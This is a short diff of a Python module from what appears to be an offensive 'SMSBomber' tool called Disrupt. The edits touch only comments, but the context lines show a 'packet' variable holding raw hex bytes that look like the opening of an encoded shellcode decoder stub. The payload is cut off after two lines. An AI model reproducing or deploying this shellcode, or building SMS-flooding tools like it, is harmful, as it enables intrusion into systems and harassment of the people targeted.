@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #----------------------------------------------------------------------------
-#						 Main Disrupt SMSBomber Modules 
+#Main Disrupt SMSBomber Modules 
 #----------------------------------------------------------------------------
 #The MIT License (MIT)
 #
@@ -31,7 +31,7 @@ from modules.utility.options import *
 from modules.utility.colors import *
 from disrupt import *
 
-#Total 93 bytes
+#Total 93 bytes for this packet
 packet = """
 		\xe4\xff\xff\x2f\xb5\xee\xe8\xb3\xa3\xe4\xf6\x48\xe8\xad\xf8
 		\x6a\x4f\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb7\x3d
